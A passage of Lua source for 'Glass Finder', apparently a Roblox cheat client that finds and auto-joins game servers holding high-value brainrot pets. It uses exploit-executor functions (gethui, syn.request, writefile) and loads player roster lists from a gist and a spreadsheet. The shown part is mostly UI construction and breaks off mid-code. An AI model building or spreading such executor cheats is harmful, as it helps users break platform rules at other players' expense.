Players          = game:GetService("Players")
RunService       = game:GetService("RunService")
TweenService     = game:GetService("TweenService")
UserInputService = game:GetService("UserInputService")
HttpService      = game:GetService("HttpService")
TeleportService  = game:GetService("TeleportService")
GuiService       = game:GetService("GuiService")
SoundService     = game:GetService("SoundService")

LocalPlayer = Players.LocalPlayer
Camera      = workspace.CurrentCamera


local function getCoreGui()
    if gethui then
        local ok, h = pcall(gethui)
        if ok and h then return h end
    end
    return game:GetService("CoreGui")
end
CoreGui = getCoreGui()


httpRequest = request or syn and syn.request or http_request or http and http.request
    or function(opts)
        local method = (opts.Method or "GET"):upper()
        local url = opts.Url
        if method == "GET" then
            return { StatusCode = 200, Body = game:HttpGet(url) }
        end
        return { StatusCode = 200, Body = game:HttpPost(url, tostring(opts.Body or "")) }
    end


DEVICE_ID = "0eaf0392a2805636515462ff6c8e73c8de46323b9bbd90efc5b2387fbfeae37f"

function http(opts)
    local ok, res = pcall(httpRequest, opts)
    if ok and res and res.Body then
        return res.StatusCode or 200, res.Body
    end
    return 0, nil
end



local SETTINGS_FILE = "GlassFinder/settings.json"

function defaultSettings()
    return {
        
        specialAlerts     = true,
        autoHideOnArrival = false,
        clearTpErrors     = true,
        shadowbanWarning  = true,
        protectRose       = false,
        markGlassUsers    = true,
        
        minGen            = 10000000,   
        minGenStep        = 10000000,
        petFilter         = false,
        ajStartEnabled    = false,
        ajOG              = false,      
        ajForceAttempts   = 3,
        ajForceGap        = 600,
        ajAutoGap         = 800,
        ajFastRetries     = true,
        ajPreferNewest    = true,
        ajQueueJoin       = true,
        ajQueueOGOnly     = false,
        
        soundEnabled      = true,
        soundVolume       = 100,
        sndFind           = "",
        sndSpecial        = "",
        sndJoin           = "",
        sndError          = "",
        
        tagTextSize       = 14,
        tagHeight         = 4,
        tagDistance       = 1000,
        teams             = {
            {
                id = "fmly", name = "FMLY", enabled = true,
                url = "https://gist.githubusercontent.com/josecastle21/fcc5696b9d37ae086a324d99e6b8fa5e/raw/fmly_badboys.json",
                key = "", goodField = "good", badField = "bad",
                goodText = "FMLY GOOD BOY", badText = "FMLY BAD BOY",
                goodColor = "#5ADCA0", badColor = "#F05A5A",
                showGood = true, showBad = true,
                manualGood = "", manualBad = "",
            },
            {
                id = "son", name = "SON", enabled = true, roster = "son",
                url = "https://docs.google.com/spreadsheets/d/16q0Kx3zxnFCOz3Fhwj2ua16yTmoU2z08c1eZL7r8VlA/export?format=csv",
                key = "", goodField = "safe", badField = "grief",
                goodText = "SON GOOD BOY", badText = "SON BAD BOY",
                goodColor = "#3C8CFF", badColor = "#F05A5A",
                showGood = true, showBad = true,
                manualGood = "", manualBad = "",
            },
            {
                id = "kawaifu", name = "Kawaifu", enabled = true, source = "kawaifu",
                url = "", key = "", goodField = "", badField = "",
                goodText = "KAWAIFU", badText = "",
                goodColor = "#FF78C8", badColor = "#F05A5A",
                showGood = true, showBad = false,
                manualGood = "", manualBad = "",
            },
            {
                id = "braintopia", name = "Braintopia", enabled = true,
                url = "", key = "", goodField = "good", badField = "bad",
                goodText = "BRAINTOPIA", badText = "",
                goodColor = "#B48CFF", badColor = "#F05A5A",
                showGood = true, showBad = false,
                manualGood = "", manualBad = "",
            },
        },
        
        kbToggle = "T",
        kbAJ     = "J",
        kbReconnect = "R",
        
        uiScale         = "Auto",
        floatingButtons = true,
        previews3D      = "Auto",
        startDelay      = false,
        
        blacklist       = {},
        petSelection    = {},
        specialList     = {},
        filterCategory  = "OG",
        filterMode      = "Filter",
    }
end

Settings = defaultSettings()

function saveSettings()
    pcall(function()
        if writefile then
            if isfolder and not isfolder("GlassFinder") and makefolder then
                makefolder("GlassFinder")
            end
            writefile(SETTINGS_FILE, HttpService:JSONEncode(Settings))
        end
    end)
end

function loadSettings()
    pcall(function()
        if readfile and isfile and isfile(SETTINGS_FILE) then
            local data = HttpService:JSONDecode(readfile(SETTINGS_FILE))
            local defs = defaultSettings()
            for k, v in pairs(data) do
                if defs[k] ~= nil then
                    Settings[k] = v
                end
            end
        end
    end)
end
loadSettings()



T = {
    winBg      = Color3.new(0.12549, 0.12549, 0.137255),   
    panelBg    = Color3.new(0.0980392, 0.0980392, 0.109804), 
    divider    = Color3.new(0.2, 0.2, 0.219608),            
    btnBg      = Color3.new(0.223529, 0.223529, 0.243137),   
    chipBg     = Color3.new(0.164706, 0.164706, 0.180392),   
    inputBg    = Color3.new(0.0980392, 0.0980392, 0.109804),
    textHi     = Color3.new(0.960784, 0.960784, 0.968627),   
    textMid    = Color3.new(0.776471, 0.776471, 0.803922),   
    textLow    = Color3.new(0.65098, 0.65098, 0.690196),     
    accent     = Color3.new(0.290196, 0.8, 0.443137),        
    statsGreen = Color3.new(0.560784, 0.8, 0.666667),        
    selectBlue = Color3.new(0.0392157, 0.411765, 0.854902),  
    rowBlue    = Color3.new(0.25098, 0.54902, 1),            
    queueGold  = Color3.new(0.854902, 0.717647, 0.439216),   
    goldDot    = Color3.new(0.92549, 0.768627, 0.376471),    
    errorRed   = Color3.new(0.898039, 0.494118, 0.494118),   
    warnYellow = Color3.new(0.854902, 0.717647, 0.439216),
    linkBlue   = Color3.new(0.439216, 0.709804, 1),          
    hoverGreen = Color3.new(0.290196, 0.8, 0.443137),
}

F = {
    builder    = "rbxasset://fonts/families/BuilderSans.json",
    gotham     = "rbxasset://fonts/families/GothamSSm.json",
    robotoMono = "rbxasset://fonts/families/RobotoMono.json",
}

function font(family, weight)
    local ok, f = pcall(function()
        return Font.new(family, Enum.FontWeight[weight or "Regular"])
    end)
    if ok and f then return f end
    return Enum.Font.Gotham
end



function colorFromHex(hex)
    hex = tostring(hex or ""):gsub("#", "")
    if #hex ~= 6 then return T.textHi end
    local r = tonumber(hex:sub(1, 2), 16) or 0
    local g = tonumber(hex:sub(3, 4), 16) or 0
    local b = tonumber(hex:sub(5, 6), 16) or 0
    return Color3.fromRGB(r, g, b)
end

function formatIncome(income, unknown)
    if unknown or not income or income <= 0 then
        return "Unknown"
    end
    if income >= 1000000 then
        return string.format("$%.2fM/s", income / 1000000)
    elseif income >= 1000 then
        return string.format("$%.2fK/s", income / 1000)
    end
    return string.format("$%d/s", math.floor(income))
end

function formatIncomeShort(v)
    if v >= 1000000 then
        local m = v / 1000000
        if m == math.floor(m) then
            return string.format("$%dM/s", m)
        end
        return string.format("$%.1fM/s", m)
    end
    return "$0"
end

local FLAGS = { US = "🇺🇸", EU = "🇪🇺", VN = "🇻🇳", AS = "🌏", SA = "🌎" }
function flagOf(region)
    return FLAGS[tostring(region or ""):upper()] or "🌐"
end

function formatAge(addedAt)
    local age = math.max(0, math.floor(os.time() - (addedAt or os.time())))
    if age < 60 then return age .. "s" end
    if age < 3600 then return math.floor(age / 60) .. "m" end
    return math.floor(age / 3600) .. "h"
end

function tween(inst, time, props, style)
    pcall(function()
        local ti = TweenInfo.new(time, style or Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(inst, ti, props):Play()
    end)
end


OG_BRAINROTS = {
    "Burbaloni Loliloli", "Cappuccino Assassino", "Ballerina Cappuccina",
    "Tung Tung Tung Sahur", "Trippi Troppi", "Boneca Ambalabu", "Frigo Camelo",
    "Brr Brr Patapim", "Chimpanzini Bananini", "Bobritto Bandito",
}
SECRET_BRAINROTS = {
    "La Grande Combinasion", "Garama and Madundung", "Los Tralaleritos",
    "Tralalero Tralala", "Bombardiro Crocodilo", "Lirili Larila",
}
EGG_BRAINROTS = { "Odin Din Din Dun", "Pipi Kiwi", "Pusheen"}


SPECIAL_PRESETS = {
    { name = "Strawberry Elephant", income = 750000000 },
    { name = "Headless Horseman",     income = 600000000 },
    { name = "Meowl",               income = 550000000 },
    { name = "John Pork",           income = 500000000 },
    { name = "Skibidi Toilet",      income = 450000000 },
}


KAWAIFU_ITEMS = {
    ["cheeky noob"] = true, ["Noob Head"] = true,
    ["halo_aura_white_Z1"] = true, ["Halo_aura_A2_white"] = true,
    ["Mahoraga White Halo"] = true,
    ["Accessory (TorsoNoob)"] = true, ["Accessory (RLegNoob)"] = true,
    ["Accessory (RArmNoob)"] = true, ["Accessory (LLegNoob)"] = true,
    ["Accessory (LArmNoob)"] = true,
}



State = {
    listings     = {},        
    listingCount = 0,
    stats        = { listings = 0, tracked = 0, perMin = 0, viewers = 0 },
    connection   = "Disconnected",  
    rows         = {},        
    autoJoin     = false,
    minimized    = false,
    page         = "Finder",
    settingsPane = "General",
    region       = "All",
    search       = "",
    sort         = "Newest",   
    hideFull     = false,
    capturing    = nil,        
    rosters      = {},         
    tagLabels    = {},         
    lastFind     = 0,
    feedThread   = nil,
    feedGen      = 0,
}


ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GlassFinder"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 2147483000
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = CoreGui


Main = Instance.new("Frame")
Main.Name = "Frame"
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.Active = true
Main.BackgroundColor3 = T.winBg
Main.BorderSizePixel = 0
Main.Size = UDim2.new(0, 730, 0, 460)
Main.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = Main

MainScale = Instance.new("UIScale")
MainScale.Scale = 1
MainScale.Parent = Main

MainStroke = Instance.new("UIStroke")
MainStroke.Color = T.divider
MainStroke.Thickness = 1
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = Main



function corner(inst, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 7)
    c.Parent = inst
    return c
end

function stroke(inst, color, thick, trans, mode)
    local s = Instance.new("UIStroke")
    s.Color = color or T.divider
    s.Thickness = thick or 1
    s.Transparency = trans or 0
    if mode then s.ApplyStrokeMode = mode end
    s.Parent = inst
    return s
end

function label(parent, text, size, color, opts)
    opts = opts or {}
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = color or T.textHi
    l.TextSize = size or 13
    l.Font = opts.font or Enum.Font.Gotham
    if opts.fontFace then l.FontFace = font(opts.fontFace, opts.weight) end
    l.TextXAlignment = opts.align or Enum.TextXAlignment.Left
    l.TextYAlignment = opts.yalign or Enum.TextYAlignment.Center
    l.TextTruncate = opts.truncate or Enum.TextTruncate.None
    l.RichText = opts.rich or false
    l.TextWrapped = opts.wrap or false
    l.Position = opts.pos or UDim2.new(0, 0, 0, 0)
    l.Size = opts.size or UDim2.new(1, 0, 1, 0)
    l.LayoutOrder = opts.order or 0
    l.AutomaticSize = opts.autoSize or Enum.AutomaticSize.None
    l.ZIndex = opts.z or 1
    l.Parent = parent
    return l
end

function button(parent, opts)
    opts = opts or {}
    local b = Instance.new("TextButton")
    b.AutoButtonColor = false
    b.BackgroundColor3 = opts.bg or T.btnBg
    b.BackgroundTransparency = opts.bgTrans or 0
    b.BorderSizePixel = 0
    b.Text = opts.text or ""
    b.TextColor3 = opts.color or T.textHi
    b.TextSize = opts.size or 13
    if opts.fontFace then b.FontFace = font(opts.fontFace, opts.weight) end
    b.Font = opts.font or Enum.Font.Gotham
    b.Position = opts.pos or UDim2.new(0, 0, 0, 0)
    b.Size = opts.dim or UDim2.new(0, 30, 0, 30)
    b.LayoutOrder = opts.order or 0
    b.AutomaticSize = opts.autoSize or Enum.AutomaticSize.None
    b.ZIndex = opts.z or 1
    b.RichText = opts.rich or false
    b.Parent = parent
    if opts.corner ~= false then corner(b, opts.corner or 7) end
    
    b.MouseEnter:Connect(function()
        if b.BackgroundTransparency < 1 then
            tween(b, 0.16, { BackgroundColor3 = opts.hoverBg or Color3.new(
                math.min(b.BackgroundColor3.R + 0.04, 1),
                math.min(b.BackgroundColor3.G + 0.04, 1),
                math.min(b.BackgroundColor3.B + 0.04, 1)) })
        end
    end)
    b.MouseLeave:Connect(function()
        if b.BackgroundTransparency < 1 then
            tween(b, 0.16, { BackgroundColor3 = opts.bg or T.btnBg })
        end
    end)
    return b
end



Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.BackgroundColor3 = T.panelBg
Sidebar.BorderSizePixel = 0
Sidebar.ZIndex = 2
Sidebar.Size = UDim2.new(0, 56, 1, 0)
Sidebar.Parent = Main
corner(Sidebar, 12)


ResizeGrip = Instance.new("Frame")
ResizeGrip.Name = "ResizeGrip"
ResizeGrip.BackgroundTransparency = 1
ResizeGrip.Position = UDim2.new(1, -14, 0, 0)
ResizeGrip.Size = UDim2.new(0, 14, 1, 0)
ResizeGrip.ZIndex = 6
ResizeGrip.Parent = Sidebar

local Divider = Instance.new("Frame")
Divider.Name = "Divider"
Divider.BackgroundColor3 = T.divider
Divider.BorderSizePixel = 0
Divider.Position = UDim2.new(1, -1, 0, 0)
Divider.ZIndex = 3
Divider.Size = UDim2.new(0, 1, 1, 0)
Divider.Parent = Sidebar

local SidebarList = Instance.new("UIListLayout")
SidebarList.SortOrder = Enum.SortOrder.LayoutOrder
SidebarList.FillDirection = Enum.FillDirection.Vertical
SidebarList.Parent = Sidebar


local SideLogo = Instance.new("ImageLabel")
SideLogo.Name = "Logo"
SideLogo.AnchorPoint = Vector2.new(0.5, 0)
SideLogo.Image = "rbxthumb://type=Asset&id=161110078&w=150&h=150"
SideLogo.BackgroundTransparency = 1
SideLogo.Position = UDim2.new(0.5, 0, 0, 12)
SideLogo.ZIndex = 3
SideLogo.ScaleType = Enum.ScaleType.Fit
SideLogo.Size = UDim2.new(0, 34, 0, 26)
SideLogo.Parent = Sidebar

local NAV_ICONS = {
    Finder   = "rbxassetid://98147715916360",
    Filters  = "rbxassetid://90067333688266",
    Settings = "rbxthumb://type=Asset&id=7145468844&w=150&h=150",
}

navButtons = {}
local function makeNavButton(name, yPos, order)
    local b = button(Sidebar, {
        bg = T.panelBg, pos = UDim2.new(0, 6, 0, yPos), dim = UDim2.new(0, 44, 0, 44),
        corner = 10, z = 5, order = order,
    })
    b.Name = name .. "Btn"
    local ic = Instance.new("ImageLabel")
    ic.Image = NAV_ICONS[name]
    ic.BackgroundTransparency = 1
    ic.Position = UDim2.new(0.5, 0, 0, 6)
    ic.ZIndex = 5
    ic.Size = UDim2.new(0, 18, 0, 18)
    ic.Parent = b
    label(b, name, 10, T.textMid, {
        align = Enum.TextXAlignment.Center, pos = UDim2.new(0, 0, 0, 27),
        size = UDim2.new(1, 0, 0, 12), z = 5, fontFace = F.builder, weight = "Medium",
    })
    navButtons[name] = { btn = b, icon = ic }
    return b
end

makeNavButton("Finder", 52, 1)
makeNavButton("Filters", 104, 2)
makeNavButton("Settings", 156, 3)

function refreshNav()
    for name, nb in pairs(navButtons) do
        local on = State.page == name
        nb.btn.BackgroundColor3 = on and T.chipBg or T.panelBg
        nb.icon.ImageColor3 = on and T.accent or T.textMid
    end
end



Content = Instance.new("Frame")
Content.Name = "Content"
Content.BackgroundTransparency = 1
Content.Position = UDim2.new(0, 56, 0, 0)
Content.Size = UDim2.new(1, -56, 1, 0)
Content.Parent = Main



TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
Content.Size = UDim2.new(1, -56, 1, 0)
TopBar.BackgroundTransparency = 1
TopBar.LayoutOrder = 1
TopBar.Size = UDim2.new(1, 0, 0, 46)
TopBar.Parent = Content

local TopDivider = Instance.new("Frame")
TopDivider.BackgroundColor3 = T.divider
TopDivider.BorderSizePixel = 0
TopDivider.LayoutOrder = 2
TopDivider.Position = UDim2.new(0, 0, 1, -1)
TopDivider.Size = UDim2.new(1, 0, 0, 1)
TopDivider.Parent = Content

TopInner = Instance.new("Frame")
TopInner.BackgroundTransparency = 1
TopInner.Position = UDim2.new(0, 12, 0, 0)
TopInner.Size = UDim2.new(1, -24, 1, 0)
TopInner.Parent = TopBar

local TopList = Instance.new("UIListLayout")
TopList.VerticalAlignment = Enum.VerticalAlignment.Center
TopList.FillDirection = Enum.FillDirection.Horizontal
TopList.Padding = UDim.new(0, 12)
TopList.SortOrder = Enum.SortOrder.LayoutOrder
TopList.Parent = TopInner


local Brand = Instance.new("Frame")
Brand.BackgroundTransparency = 1
Brand.AutomaticSize = Enum.AutomaticSize.X
Brand.LayoutOrder = 1
Brand.Size = UDim2.new(0, 0, 0, 30)
Brand.Parent = TopInner

local BrandList = Instance.new("UIListLayout")
BrandList.FillDirection = Enum.FillDirection.Horizontal
BrandList.Padding = UDim.new(0, 10)
BrandList.VerticalAlignment = Enum.VerticalAlignment.Center
BrandList.SortOrder = Enum.SortOrder.LayoutOrder
BrandList.Parent = Brand

label(Brand, "Glass Finder", 16, T.textHi, {
    font = Enum.Font.GothamBold, order = 2, autoSize = Enum.AutomaticSize.X,
    dim = UDim2.new(0, 0, 0, 30), size = UDim2.new(0, 0, 0, 30),
})


local TopSpacer = Instance.new("Frame")
TopSpacer.BackgroundTransparency = 1
TopSpacer.LayoutOrder = 20
TopSpacer.Size = UDim2.new(1, -520, 0, 30)
TopSpacer.Parent = TopInner



function updateTopBarResponsive()
    local w = Content.AbsoluteSize.X
    local wide = w >= 880
    SearchBox.Visible = wide
    RegionBox.Visible = wide
end


OGBtn = button(TopInner, {
    bg = T.chipBg, dim = UDim2.new(0, 80, 0, 30), order = 4,
})
OGBtn.Name = "OGBtn"
local OGLabel = label(OGBtn, "OG", 12, Color3.new(1, 1, 1), {
    align = Enum.TextXAlignment.Center, fontFace = F.gotham, weight = "ExtraBold",
    dim = UDim2.new(0, 30, 0, 30), size = UDim2.new(0, 30, 0, 30),
})
OGLabel.Size = UDim2.new(1, 0, 1, 0)
local OGStroke = stroke(OGLabel, Color3.new(0, 0, 0), 1, 0.4, Enum.ApplyStrokeMode.Contextual)
local OGGradient = Instance.new("UIGradient")
OGGradient.Rotation = 90
OGGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.new(1, 1, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.new(0, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.new(1, 1, 0)),
})
OGGradient.Parent = OGLabel


SearchBox = Instance.new("Frame")
SearchBox.Name = "SearchBox"
SearchBox.BackgroundColor3 = T.panelBg
SearchBox.BorderSizePixel = 0
SearchBox.ClipsDescendants = true
SearchBox.LayoutOrder = 5
SearchBox.Size = UDim2.new(0, 200, 0, 30)
SearchBox.Visible = false
SearchBox.Parent = TopInner
corner(SearchBox, 8)
stroke(SearchBox, T.divider, 1, 0)

local SearchIcon = Instance.new("ImageLabel")
SearchIcon.AnchorPoint = Vector2.new(0, 0.5)
SearchIcon.Image = "rbxthumb://type=Asset&id=77505819126275&w=150&h=150"
SearchIcon.ImageColor3 = T.textMid
SearchIcon.BackgroundTransparency = 1
SearchIcon.Position = UDim2.new(0, 0, 0.5, 0)
SearchIcon.Size = UDim2.new(0, 14, 0, 14)
SearchIcon.ZIndex = 2
SearchIcon.Parent = SearchBox

SearchInput = Instance.new("TextBox")
SearchInput.Name = "SearchInput"
SearchInput.Text = ""
SearchInput.TextColor3 = T.textHi
SearchInput.ClearTextOnFocus = false
SearchInput.TextXAlignment = Enum.TextXAlignment.Left
SearchInput.Font = Enum.Font.GothamMedium
SearchInput.BackgroundTransparency = 1
SearchInput.PlaceholderColor3 = T.textMid
SearchInput.PlaceholderText = "Search brainrot or owner…"
SearchInput.Position = UDim2.new(0, 22, 0, 0)
SearchInput.TextSize = 13
SearchInput.Size = UDim2.new(1, -22, 1, 0)
SearchInput.ZIndex = 2
SearchInput.Parent = SearchBox


RegionBox = Instance.new("Frame")
RegionBox.Name = "RegionBox"
RegionBox.BackgroundColor3 = T.panelBg
RegionBox.BorderSizePixel = 0
RegionBox.ClipsDescendants = true
RegionBox.LayoutOrder = 6
RegionBox.Size = UDim2.new(0, 148, 0, 30)
RegionBox.Visible = false
RegionBox.Parent = TopInner
corner(RegionBox, 8)

regionButtons = {}
local RegionLine = Instance.new("Frame")
RegionLine.Name = "SelectionLine"
RegionLine.BackgroundColor3 = T.selectBlue
RegionLine.BorderSizePixel = 0
RegionLine.Position = UDim2.new(0, 8, 1, -2)
RegionLine.Size = UDim2.new(0, 24, 0, 2)
RegionLine.ZIndex = 3
RegionLine.Parent = RegionBox

local REGIONS = { "All", "🇺🇸", "🇪🇺", "🇻🇳" }
local REGION_X = { All = 0, ["🇺🇸"] = 40, ["🇪🇺"] = 76, ["🇻🇳"] = 112 }
local REGION_W = { All = 40, ["🇺🇸"] = 36, ["🇪🇺"] = 36, ["🇻🇳"] = 36 }
for _, r in ipairs(REGIONS) do
    local rb = button(RegionBox, {
        bg = T.panelBg, bgTrans = 1, text = r, z = 2, corner = false,
        pos = UDim2.new(0, REGION_X[r], 0, 0), dim = UDim2.new(0, REGION_W[r], 1, 0),
        size = r == "All" and 12 or 17, fontFace = F.builder, weight = "Medium",
        color = T.textMid,
    })
    regionButtons[r] = rb
end

function setRegion(r)
    State.region = r
    for name, rb in pairs(regionButtons) do
        local on = name == r
        rb.BackgroundColor3 = on and T.inputBg or T.panelBg
        rb.BackgroundTransparency = on and 0 or 1
        rb.TextColor3 = on and T.textHi or T.textMid
    end
    tween(RegionLine, 0.16, {
        Position = UDim2.new(0, REGION_X[r] + 8, 1, -2),
        Size = UDim2.new(0, REGION_W[r] - 16, 0, 2),
    })
    scheduleRefresh()
end


AJBtn = button(TopInner, { bg = T.btnBg, dim = UDim2.new(0, 112, 0, 30), order = 7 })
AJBtn.Name = "AutoJoinBtn"
label(AJBtn, "Auto Join", 13, T.textHi, {
    pos = UDim2.new(0, 8, 0, 0), size = UDim2.new(0, 64, 0, 30),
    fontFace = F.builder, weight = "Bold",
})
local AJTrack = Instance.new("Frame")
AJTrack.BackgroundColor3 = T.divider
AJTrack.BorderSizePixel = 0
AJTrack.Position = UDim2.new(1, -46, 0.5, -12)
AJTrack.Size = UDim2.new(0, 40, 0, 24)
AJTrack.ZIndex = 2
AJTrack.Parent = AJBtn
corner(AJTrack, 12)
local AJKnob = Instance.new("Frame")
AJKnob.BackgroundColor3 = Color3.new(1, 1, 1)
AJKnob.BorderSizePixel = 0
AJKnob.Position = UDim2.new(0, 2, 0, 2)
AJKnob.Size = UDim2.new(0, 20, 0, 20)
AJKnob.ZIndex = 3
AJKnob.Parent = AJTrack
corner(AJKnob, 10)

function setAJVisual(on)
    tween(AJTrack, 0.16, { BackgroundColor3 = on and T.accent or T.divider })
    tween(AJKnob, 0.16, { Position = on and UDim2.new(0, 18, 0, 2) or UDim2.new(0, 2, 0, 2) })
end


RefreshBtn = button(TopInner, {
    bg = T.chipBg, dim = UDim2.new(0, 0, 0, 30), order = 8,
    autoSize = Enum.AutomaticSize.X,
})
RefreshBtn.Name = "RefreshBtn"
local RefreshPad = Instance.new("UIPadding")
RefreshPad.PaddingLeft = UDim.new(0, 10)
RefreshPad.PaddingRight = UDim.new(0, 10)
RefreshPad.Parent = RefreshBtn
local RefreshInner = Instance.new("Frame")
RefreshInner.BackgroundTransparency = 1
RefreshInner.Size = UDim2.new(0, 0, 1, 0)
RefreshInner.AutomaticSize = Enum.AutomaticSize.X
RefreshInner.Parent = RefreshBtn
local RefreshList = Instance.new("UIListLayout")
RefreshList.FillDirection = Enum.FillDirection.Horizontal
RefreshList.Padding = UDim.new(0, 6)
RefreshList.VerticalAlignment = Enum.VerticalAlignment.Center
RefreshList.SortOrder = Enum.SortOrder.LayoutOrder
RefreshList.Parent = RefreshInner
local RefreshIcon = Instance.new("ImageLabel")
RefreshIcon.Image = "rbxassetid://7734051052"
RefreshIcon.ImageColor3 = T.textHi
RefreshIcon.BackgroundTransparency = 1
RefreshIcon.LayoutOrder = 1
RefreshIcon.Size = UDim2.new(0, 14, 0, 14)
RefreshIcon.Parent = RefreshInner
RefreshLabel = label(RefreshInner, "Refresh", 13, T.textHi, {
    order = 2, rich = true, fontFace = F.builder, weight = "SemiBold",
    autoSize = Enum.AutomaticSize.X, size = UDim2.new(0, 0, 1, 0),
})


RejoinBtn = button(TopInner, {
    bg = T.chipBg, dim = UDim2.new(0, 0, 0, 30), order = 9,
    autoSize = Enum.AutomaticSize.X,
})
RejoinBtn.Name = "RejoinBtn"
local RejoinPad = Instance.new("UIPadding")
RejoinPad.PaddingLeft = UDim.new(0, 10)
RejoinPad.PaddingRight = UDim.new(0, 10)
RejoinPad.Parent = RejoinBtn
local RejoinLabel = label(RejoinBtn, "Rejoin", 13, T.textMid, {
    align = Enum.TextXAlignment.Center, fontFace = F.builder, weight = "SemiBold",
})


MinBtn = button(TopInner, {
    bg = T.chipBg, bgTrans = 1, text = "–", order = 10,
    dim = UDim2.new(0, 30, 0, 30), size = 18, color = T.textMid,
    fontFace = F.builder, weight = "ExtraBold",
})
MinBtn.Name = "MinimizeBtn"



local StatusBar = Instance.new("Frame")
StatusBar.Name = "StatusBar"
StatusBar.BackgroundTransparency = 1
StatusBar.LayoutOrder = 4
StatusBar.Position = UDim2.new(0, 0, 1, -46)
StatusBar.Size = UDim2.new(1, 0, 0, 46)
StatusBar.ZIndex = 4
StatusBar.Parent = Content

local StatusTopLine = Instance.new("Frame")
StatusTopLine.BackgroundColor3 = T.divider
StatusTopLine.BorderSizePixel = 0
StatusTopLine.Position = UDim2.new(0, 0, 0, 0)
StatusTopLine.Size = UDim2.new(1, 0, 0, 1)
StatusTopLine.ZIndex = 4
StatusTopLine.Parent = StatusBar


local StatusPill = Instance.new("Frame")
StatusPill.BackgroundTransparency = 1
StatusPill.Position = UDim2.new(0, 12, 0, 5)
StatusPill.Size = UDim2.new(0, 150, 0, 36)
StatusPill.ZIndex = 4
StatusPill.Parent = StatusBar

local StatusDot = Instance.new("Frame")
StatusDot.BackgroundColor3 = T.errorRed
StatusDot.BorderSizePixel = 0
StatusDot.Position = UDim2.new(0, 0, 0.5, -3)
StatusDot.Size = UDim2.new(0, 6, 0, 6)
StatusDot.ZIndex = 4
StatusDot.Parent = StatusPill
corner(StatusDot, 3)

local StatusLabel = label(StatusPill, "Disconnected", 13, T.errorRed, {
    pos = UDim2.new(0, 12, 0, 0), size = UDim2.new(1, -12, 1, 0), z = 4,
    fontFace = F.builder, weight = "SemiBold",
})

local STATUS_STYLE = {
    Disconnected = { T.errorRed, "Disconnected" },
    Connecting   = { T.warnYellow, "Connecting" },
    Authenticating = { T.warnYellow, "Authenticating" },
    Connected    = { T.accent, "Connected" },
}

function setConnection(status)
    State.connection = status
    local st = STATUS_STYLE[status] or STATUS_STYLE.Disconnected
    StatusDot.BackgroundColor3 = st[1]
    StatusLabel.Text = st[2]
    StatusLabel.TextColor3 = st[1]
end


StatsLabel = label(StatusBar, "0 brainrots · 0 servers", 13, T.textMid, {
    pos = UDim2.new(0, 172, 0, 5), size = UDim2.new(0, 220, 0, 36), z = 4,
    fontFace = F.builder, weight = "Medium", order = 2,
})
PerMinLabel = label(StatusBar, "0/min found", 13, T.statsGreen, {
    pos = UDim2.new(0, 392, 0, 5), size = UDim2.new(0, 140, 0, 36), z = 4,
    fontFace = F.builder, weight = "Medium", order = 3,
})


local ViewersPill = Instance.new("Frame")
ViewersPill.BackgroundTransparency = 1
ViewersPill.Position = UDim2.new(1, -262, 0, 5)
ViewersPill.Size = UDim2.new(0, 46, 0, 36)
ViewersPill.ZIndex = 4
ViewersPill.Parent = StatusBar
local ViewersDot = Instance.new("Frame")
ViewersDot.BackgroundColor3 = T.textMid
ViewersDot.BorderSizePixel = 0
ViewersDot.Position = UDim2.new(0, 0, 0.5, -3)
ViewersDot.Size = UDim2.new(0, 6, 0, 6)
ViewersDot.ZIndex = 4
ViewersDot.Parent = ViewersPill
corner(ViewersDot, 3)
ViewersLabel = label(ViewersPill, "0", 13, T.textMid, {
    pos = UDim2.new(0, 12, 0, 0), size = UDim2.new(1, -12, 1, 0), z = 4,
    fontFace = F.builder, weight = "Medium",
})


DiscordBtn = button(StatusBar, {
    bg = T.chipBg, bgTrans = 1, text = "discord.gg/GlassFinder", order = 5,
    pos = UDim2.new(1, -202, 0, 6), dim = UDim2.new(0, 190, 0, 34),
    size = 14, color = T.linkBlue, z = 4, corner = false,
})
DiscordBtn.Name = "DiscordBtn"
DiscordBtn.TextXAlignment = Enum.TextXAlignment.Right



Dock = Instance.new("Frame")
Dock.Name = "Dock"
Dock.BackgroundColor3 = T.panelBg
Dock.BackgroundTransparency = 0.04
Dock.BorderSizePixel = 0
Dock.Position = UDim2.new(1, 12, 0.5, 0)
Dock.Size = UDim2.new(0, 58, 0, 100)
Dock.Visible = false
Dock.ZIndex = 8
Dock.Parent = Main
corner(Dock, 14)

local DockLine = Instance.new("Frame")
DockLine.BackgroundColor3 = T.divider
DockLine.BorderSizePixel = 0
DockLine.Position = UDim2.new(0, 9, 0, 50)
DockLine.Size = UDim2.new(0, 28, 0, 1)
DockLine.ZIndex = 8
DockLine.Parent = Dock

local function dockButton(yPos)
    local b = Instance.new("TextButton")
    b.AutoButtonColor = false
    b.BackgroundColor3 = T.chipBg
    b.BorderSizePixel = 0
    b.Position = UDim2.new(0, 3, 0, yPos)
    b.Size = UDim2.new(0, 40, 0, 40)
    b.Text = ""
    b.ZIndex = 9
    b.Parent = Dock
    corner(b, 10)
    local s = stroke(b, T.textHi, 1.2, 0.35)
    b.MouseEnter:Connect(function()
        tween(s, 0.16, { Transparency = 0 })
    end)
    b.MouseLeave:Connect(function()
        tween(s, 0.16, { Transparency = 0.35 })
    end)
    return b
end

DockPanelBtn = dockButton(5)
local DockLogo = Instance.new("ImageLabel")
DockLogo.AnchorPoint = Vector2.new(0.5, 0.5)
DockLogo.Image = "rbxthumb://type=Asset&id=161110078&w=150&h=150"
DockLogo.BackgroundTransparency = 1
DockLogo.Position = UDim2.new(0.5, 0, 0.5, 0)
